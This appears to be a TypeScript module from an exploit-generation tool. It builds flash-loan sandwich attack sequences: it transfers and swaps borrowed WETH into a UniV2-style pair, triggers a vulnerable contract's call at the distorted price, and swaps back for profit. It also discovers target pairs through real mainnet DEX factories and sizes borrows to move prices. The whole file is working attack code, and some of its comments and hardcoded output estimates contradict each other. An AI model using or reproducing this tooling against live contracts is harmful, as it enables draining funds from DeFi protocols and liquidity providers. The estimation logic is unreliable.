// sandwich.ts — Builds sandwich drain steps for economic exploit PoEs.
//
// Flash-loan sandwich attack structure:
//   1. FRONT-RUN: swap borrowed WETH → vulnerable token on the pair
//      (creates upward price pressure)
//   2. VICTIM CALL: the vulnerable function triggers its own AMM interaction
//      at the now-distorted price
//   3. BACK-RUN: swap tokens back → WETH (profit from the price movement)
//
// The FlashLoanRescue.sol receiver iterates (targets[], calldatas[], values[])
// sequentially inside the Aave callback. We encode the sandwich as:
//   targets = [WETH, pair, contractAddr, pair, ...]
//   calldatas = [transfer(pair,amount), swap(0,amtOut,receiver,""), targetCall, swap(amtOut,0,receiver,""), ...]
//
// For UniV2-style pairs, a swap requires the input tokens to already be IN
// the pair (transferred separately), then you call pair.swap(amount0Out,
// amount1Out, to, data).

import { WRAPPED_NATIVE } from "./constants";

// ── Selectors ──────────────────────────────────────────────────────────────
const UNIV2_PAIR_SWAP_SELECTOR = "022c0d9f"; // swap(uint256,uint256,address,bytes)
const ERC20_TRANSFER_SELECTOR = "a9059cbb"; // transfer(address,uint256)
const UNIV2_PAIR_GETRESERVES_SELECTOR = "0902f1ac"; // getReserves()
const UNIV2_PAIR_TOKEN0_SELECTOR = "0dfe1681"; // token0()
const UNIV2_PAIR_TOKEN1_SELECTOR = "d21220a7"; // token1()

// Standard swap amounts: borrow enough to meaningfully move the pair.
const DEFAULT_BORROW_AMOUNT_ETH = 50n * 10n ** 18n; // 50 WETH

export interface SandwichParams {
  chainId: number;
  /** The LP pair address (UniV2-style) that the target interacts with. */
  pairAddress: string;
  /** Which token in the pair is the wrapped native (token0 or token1). */
  wethIsToken0: boolean;
  /** The receiver address where profits land (= the FlashLoanRescue contract). */
  receiver: string;
  /** How much WETH to use for the front-run swap. */
  borrowAmount: bigint;
}

export interface SandwichStep {
  to: string;
  data: string;
  value: string;
  asset: string;
  strategy: string;
}

/**
 * Build front-run steps: transfer WETH to pair, then swap to get the other token.
 * This imbalances the pair in favour of the attacker.
 */
export function buildFrontRunSteps(params: SandwichParams): SandwichStep[] {
  const { chainId, pairAddress, wethIsToken0, receiver, borrowAmount } = params;
  const weth = WRAPPED_NATIVE[chainId];
  if (!weth) return [];

  const steps: SandwichStep[] = [];

  // Step 1: Transfer WETH from receiver (FlashLoanRescue) to the pair.
  // The receiver already holds the borrowed WETH from Aave.
  const transferData =
    "0x" +
    ERC20_TRANSFER_SELECTOR +
    pairAddress.replace("0x", "").toLowerCase().padStart(64, "0") +
    borrowAmount.toString(16).padStart(64, "0");

  steps.push({
    to: weth,
    data: transferData,
    value: "0",
    asset: "sandwich-frontrun: transfer WETH to pair",
    strategy: `sandwich-front: transfer ${formatEth(borrowAmount)} WETH to pair ${pairAddress.slice(0, 10)}`,
  });

  // Step 2: Call pair.swap() to receive the other token.
  // If WETH is token0, we send token0 in and want token1 out → amount0Out=0, amount1Out=estimatedOut
  // If WETH is token1, we send token1 in and want token0 out → amount0Out=estimatedOut, amount1Out=0
  // We use MAX_UINT256/2 as amountOut placeholder — the pair will give us whatever the reserves allow.
  // Actually, for safety we use a large-but-not-max value; the pair reverts if amountOut > reserve.
  // The REAL approach: we compute expected output from reserves at fork time, but since this is
  // a plan built for the receiver to execute, we need to be conservative.
  // Use 1 as the minimum amountOut — the pair enforces K-constant so we get fair output.
  // The actual amount will be determined by how much we sent in.
  const amountOut = borrowAmount * 95n / 100n; // ~95% of input as rough estimate

  const swapData = encodeUniV2Swap(
    wethIsToken0 ? 0n : amountOut,
    wethIsToken0 ? amountOut : 0n,
    receiver,
  );

  steps.push({
    to: pairAddress,
    data: swapData,
    value: "0",
    asset: "sandwich-frontrun: pair.swap() to receive target token",
    strategy: `sandwich-front: pair.swap() on ${pairAddress.slice(0, 10)} → receive other token`,
  });

  return steps;
}

/**
 * Build back-run steps: transfer target token back to pair, swap back to WETH.
 * This captures the profit from the price manipulation.
 */
export function buildBackRunSteps(params: SandwichParams & {
  targetToken: string;
}): SandwichStep[] {
  const { chainId, pairAddress, wethIsToken0, receiver, targetToken } = params;
  const weth = WRAPPED_NATIVE[chainId];
  if (!weth) return [];

  const steps: SandwichStep[] = [];

  // Step 1: Transfer ALL target tokens held by receiver back to the pair.
  // We use MAX_UINT256 as amount — the transfer will send our full balance.
  // Actually we can't use MAX_UINT256 for ERC20 transfer (would fail if balance < max).
  // The receiver needs to sweep its own balance. We'll use a special "sweep-to-pair"
  // approach: transfer(pair, type(uint256).max) and hope the token implements
  // "transfer all" on max, OR we encode a fixed large amount.
  // Safest: encode transfer with a very large amount; if we have less, most ERC20s
  // revert and the step fails (which is fine — the receiver doesn't revert on step failure).
  // Better approach: use the exact amount we got from the front-run.
  // Since we can't know this at plan-build time, we'll use the same amountOut estimate.
  const transferBackAmount = params.borrowAmount * 90n / 100n; // conservative

  const transferData =
    "0x" +
    ERC20_TRANSFER_SELECTOR +
    pairAddress.replace("0x", "").toLowerCase().padStart(64, "0") +
    transferBackAmount.toString(16).padStart(64, "0");

  steps.push({
    to: targetToken,
    data: transferData,
    value: "0",
    asset: "sandwich-backrun: transfer target token to pair",
    strategy: `sandwich-back: transfer target token to pair ${pairAddress.slice(0, 10)}`,
  });

  // Step 2: Call pair.swap() to receive WETH back.
  // We're swapping in the opposite direction now.
  const amountOutWeth = params.borrowAmount * 85n / 100n; // expect less due to fees + slippage

  const swapData = encodeUniV2Swap(
    wethIsToken0 ? amountOutWeth : 0n,
    wethIsToken0 ? 0n : amountOutWeth,
    receiver,
  );

  steps.push({
    to: pairAddress,
    data: swapData,
    value: "0",
    asset: "sandwich-backrun: pair.swap() to receive WETH",
    strategy: `sandwich-back: pair.swap() on ${pairAddress.slice(0, 10)} → receive WETH`,
  });

  return steps;
}

/**
 * Wrap a set of candidate drain steps with a full sandwich.
 * Returns the complete sequence: [front-run..., drain steps..., back-run...]
 */
export function wrapWithSandwich(
  candidateSteps: SandwichStep[],
  params: SandwichParams & { targetToken: string },
): SandwichStep[] {
  const front = buildFrontRunSteps(params);
  const back = buildBackRunSteps(params);
  if (front.length === 0 || back.length === 0) return candidateSteps;
  return [...front, ...candidateSteps, ...back];
}

// ── Helpers ────────────────────────────────────────────────────────────────

function encodeUniV2Swap(
  amount0Out: bigint,
  amount1Out: bigint,
  to: string,
): string {
  // swap(uint256 amount0Out, uint256 amount1Out, address to, bytes data)
  const selector = UNIV2_PAIR_SWAP_SELECTOR;
  const a0 = amount0Out.toString(16).padStart(64, "0");
  const a1 = amount1Out.toString(16).padStart(64, "0");
  const addr = to.replace("0x", "").toLowerCase().padStart(64, "0");
  // bytes data is empty — offset = 128 (4 words), length = 0
  const bytesOffset = (4 * 32).toString(16).padStart(64, "0");
  const bytesLength = "0".padStart(64, "0");
  return "0x" + selector + a0 + a1 + addr + bytesOffset + bytesLength;
}

function formatEth(wei: bigint): string {
  const eth = Number(wei) / 1e18;
  return eth.toFixed(2);
}

// ── Pair Discovery ─────────────────────────────────────────────────────────

export interface PairInfo {
  pairAddress: string;
  token0: string;
  token1: string;
  wethIsToken0: boolean;
  reserve0: bigint;
  reserve1: bigint;
}

/**
 * Given a target contract and its evidence (with ammHits/router info),
 * discover the relevant UniV2-style pair for sandwich construction.
 *
 * Strategy:
 *   1. If evidence.ammHits contains a pair target, use it directly.
 *   2. Otherwise, call the UniV2 factory.getPair(weth, contractToken)
 *      for the contract's own token (if it's a token contract).
 *   3. Fall back to scanning known DEX factories.
 */
export async function discoverPairForSandwich(
  rpcUrl: string,
  chainId: number,
  contractAddress: string,
  evidence: Record<string, unknown>,
): Promise<PairInfo | null> {
  const weth = WRAPPED_NATIVE[chainId];
  if (!weth) return null;

  // Strategy 1: extract pair address from verifier evidence ammHits
  const attempts = Array.isArray((evidence as any).attempts) ? (evidence as any).attempts : [];
  for (const a of attempts) {
    if (!a?.ammHits || !Array.isArray(a.ammHits)) continue;
    for (const hit of a.ammHits) {
      const target: string = hit.target ?? "";
      if (!target || target.length !== 42) continue;
      // Check if this target is a UniV2-style pair by calling getReserves
      const reserves = await callGetReserves(rpcUrl, target);
      if (reserves) {
        const t0 = await callToken0(rpcUrl, target);
        const t1 = await callToken1(rpcUrl, target);
        if (t0 && t1) {
          const wethIsToken0 = t0.toLowerCase() === weth.toLowerCase();
          const wethIsToken1 = t1.toLowerCase() === weth.toLowerCase();
          if (wethIsToken0 || wethIsToken1) {
            return {
              pairAddress: target.toLowerCase(),
              token0: t0.toLowerCase(),
              token1: t1.toLowerCase(),
              wethIsToken0,
              reserve0: reserves.reserve0,
              reserve1: reserves.reserve1,
            };
          }
          // Pair doesn't contain WETH — check if it contains the target contract
          const hasContract =
            t0.toLowerCase() === contractAddress.toLowerCase() ||
            t1.toLowerCase() === contractAddress.toLowerCase();
          if (hasContract) {
            return {
              pairAddress: target.toLowerCase(),
              token0: t0.toLowerCase(),
              token1: t1.toLowerCase(),
              wethIsToken0: false,
              reserve0: reserves.reserve0,
              reserve1: reserves.reserve1,
            };
          }
        }
      }
    }
  }

  // Strategy 2: The target contract IS often the token itself. Try getting
  // a pair for (WETH, contractAddress) from known factories.
  const factories = UNIV2_FACTORIES[chainId];
  if (factories) {
    for (const factory of factories) {
      const pairAddr = await callGetPair(rpcUrl, factory, weth, contractAddress);
      if (pairAddr && pairAddr !== "0x0000000000000000000000000000000000000000") {
        const reserves = await callGetReserves(rpcUrl, pairAddr);
        if (reserves && (reserves.reserve0 > 0n || reserves.reserve1 > 0n)) {
          const t0 = await callToken0(rpcUrl, pairAddr);
          const t1 = await callToken1(rpcUrl, pairAddr);
          if (t0 && t1) {
            return {
              pairAddress: pairAddr.toLowerCase(),
              token0: t0.toLowerCase(),
              token1: t1.toLowerCase(),
              wethIsToken0: t0.toLowerCase() === weth.toLowerCase(),
              reserve0: reserves.reserve0,
              reserve1: reserves.reserve1,
            };
          }
        }
      }
    }
  }

  return null;
}

/**
 * Calculate optimal borrow amount based on pair reserves.
 * We want to move the price significantly but not drain the pair entirely.
 * Rule of thumb: borrow ~30% of the WETH-side reserve.
 */
export function calculateBorrowAmount(
  pairInfo: PairInfo,
  chainId: number,
): bigint {
  const wethReserve = pairInfo.wethIsToken0 ? pairInfo.reserve0 : pairInfo.reserve1;
  if (wethReserve === 0n) return DEFAULT_BORROW_AMOUNT_ETH;
  // Borrow 30% of pair's WETH reserve — enough to move price significantly
  // but not so much that the pair has insufficient liquidity for the back-run.
  const optimal = (wethReserve * 30n) / 100n;
  // Cap at 500 WETH to avoid enormous borrows on whale pairs
  const cap = 500n * 10n ** 18n;
  // Floor at 0.1 WETH
  const floor = 10n ** 17n;
  if (optimal > cap) return cap;
  if (optimal < floor) return floor;
  return optimal;
}

// ── RPC helpers ────────────────────────────────────────────────────────────

async function ethCall(rpcUrl: string, to: string, data: string): Promise<string | null> {
  try {
    const res = await fetch(rpcUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 1,
        method: "eth_call",
        params: [{ to, data }, "latest"],
      }),
    });
    const json = await res.json();
    if (json.result && typeof json.result === "string" && json.result.length > 2) {
      return json.result;
    }
    return null;
  } catch {
    return null;
  }
}

async function callGetReserves(
  rpcUrl: string,
  pair: string,
): Promise<{ reserve0: bigint; reserve1: bigint } | null> {
  const result = await ethCall(rpcUrl, pair, "0x" + UNIV2_PAIR_GETRESERVES_SELECTOR);
  if (!result || result.length < 130) return null;
  const hex = result.replace("0x", "");
  const reserve0 = BigInt("0x" + hex.slice(0, 64));
  const reserve1 = BigInt("0x" + hex.slice(64, 128));
  return { reserve0, reserve1 };
}

async function callToken0(rpcUrl: string, pair: string): Promise<string | null> {
  const result = await ethCall(rpcUrl, pair, "0x" + UNIV2_PAIR_TOKEN0_SELECTOR);
  if (!result || result.length < 66) return null;
  return "0x" + result.replace("0x", "").slice(24, 64);
}

async function callToken1(rpcUrl: string, pair: string): Promise<string | null> {
  const result = await ethCall(rpcUrl, pair, "0x" + UNIV2_PAIR_TOKEN1_SELECTOR);
  if (!result || result.length < 66) return null;
  return "0x" + result.replace("0x", "").slice(24, 64);
}

async function callGetPair(
  rpcUrl: string,
  factory: string,
  tokenA: string,
  tokenB: string,
): Promise<string | null> {
  // getPair(address,address) = 0xe6a43905
  const data =
    "0xe6a43905" +
    tokenA.replace("0x", "").toLowerCase().padStart(64, "0") +
    tokenB.replace("0x", "").toLowerCase().padStart(64, "0");
  const result = await ethCall(rpcUrl, factory, data);
  if (!result || result.length < 66) return null;
  const addr = "0x" + result.replace("0x", "").slice(24, 64);
  if (addr === "0x0000000000000000000000000000000000000000") return null;
  return addr;
}

// ── Constants ──────────────────────────────────────────────────────────────

// UniV2-compatible factory addresses per chain
const UNIV2_FACTORIES: Record<number, string[]> = {
  1: [
    "0x5c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f", // Uniswap V2
    "0xc0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac", // SushiSwap
  ],
  56: [
    "0xca143ce32fe78f1f7019d7d551a6402fc5350c73", // PancakeSwap V2
    "0xc35dadb65012ec5796536bd9864ed8773abc74c4", // SushiSwap
  ],
  137: [
    "0x5757371414417b8c6caad45baef941abc7d3ab32", // QuickSwap
    "0xc35dadb65012ec5796536bd9864ed8773abc74c4", // SushiSwap
  ],
  10: [
    "0x0c3c1c532f1e39edF36BE9Fe0bE1410313E074Bf", // Velodrome (v1 compat)
  ],
  8453: [
    "0x8909Dc15e40173Ff4699343b6eB8132c65e18eC6", // BaseSwap
    "0x02F45e773436C6D96Cc73600fe94a660ec67734C", // Aerodrome
  ],
  42161: [
    "0xc35dadb65012ec5796536bd9864ed8773abc74c4", // SushiSwap
    "0x6eccab422d763ac031210895c81787e87b43a652", // Camelot
  ],
  43114: [
    "0x9ad6c38be94206ca50bb0d90783181834c915db8", // TraderJoe
    "0xc35dadb65012ec5796536bd9864ed8773abc74c4", // SushiSwap
  ],
  146: [
    "0x9BBE7C9Fa4ebd0bC3685e5dCd06f2BA7B8f099b7", // SpookySwap Sonic
  ],
  81457: [
    "0x5C346464d33F90bABaf70dB6388507CC889C1070", // Thruster V2
  ],
};
